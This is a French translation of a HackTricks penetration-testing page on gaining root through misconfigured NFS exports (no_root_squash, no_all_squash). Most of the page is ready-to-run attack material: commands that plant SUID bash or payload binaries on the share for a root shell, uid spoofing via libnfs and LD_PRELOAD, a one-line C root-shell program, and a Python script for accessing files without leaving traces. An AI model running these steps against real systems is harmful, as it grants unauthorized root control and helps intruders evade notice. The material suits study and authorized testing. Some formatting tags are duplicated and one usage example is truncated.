{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Lisez le _ **/etc/exports** _ fichier, si vous trouvez un répertoire configuré comme **no\_root\_squash**, alors vous pouvez **y accéder** **en tant que client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

**no\_root\_squash** : Cette option donne essentiellement l'autorité à l'utilisateur root sur le client d'accéder aux fichiers sur le serveur NFS en tant que root. Et cela peut entraîner de graves implications en matière de sécurité.

**no\_all\_squash :** Cela est similaire à l'option **no\_root\_squash** mais s'applique aux **utilisateurs non-root**. Imaginez que vous avez un shell en tant qu'utilisateur nobody ; vérifiez le fichier /etc/exports ; l'option no\_all\_squash est présente ; vérifiez le fichier /etc/passwd ; émulez un utilisateur non-root ; créez un fichier suid en tant que cet utilisateur (en montant via nfs). Exécutez le suid en tant qu'utilisateur nobody et devenez un utilisateur différent.

# Élévation de privilèges

## Exploit à distance

Si vous avez trouvé cette vulnérabilité, vous pouvez l'exploiter :

* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté le binaire **/bin/bash** et lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui abusent de la permission SUID, lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version distante pour exploiter cette élévation de privilèges en tunnelant les ports requis**.\
Le truc suivant est dans le cas où le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploit distant** et vous devrez **abuser de ce truc**.\
Une autre exigence nécessaire pour que l'exploit fonctionne est que **l'exportation à l'intérieur de `/etc/export`** **doit utiliser le drapeau `insecure`**.\
\--_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, ce truc fonctionnera_--
{% endhint %}

## Basic Information

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, tirant parti d'un défaut dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, ce qui peut permettre un accès non autorisé. L'exploitation implique l'utilisation de [libnfs](https://github.com/sahlberg/libnfs), une bibliothèque qui permet de forger des appels RPC NFS.

### Compiling the Library

Les étapes de compilation de la bibliothèque peuvent nécessiter des ajustements en fonction de la version du noyau. Dans ce cas spécifique, les appels système fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Réalisation de l'Exploitation

L'exploitation consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root et exécute ensuite un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier le uid dans les appels RPC :

1. **Compiler le code d'exploitation :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Placer l'exploitation sur le partage et modifier ses permissions en falsifiant le uid :**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exécuter l'exploitation pour obtenir des privilèges root :**
```bash
/mnt/share/a.out
#root
```

## Bonus : NFShell pour un Accès Furtif aux Fichiers
Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer de propriétaire (pour éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste le uid pour correspondre à celui du fichier accédé, permettant d'interagir avec les fichiers sur le partage sans problèmes de permission :
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécuter comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
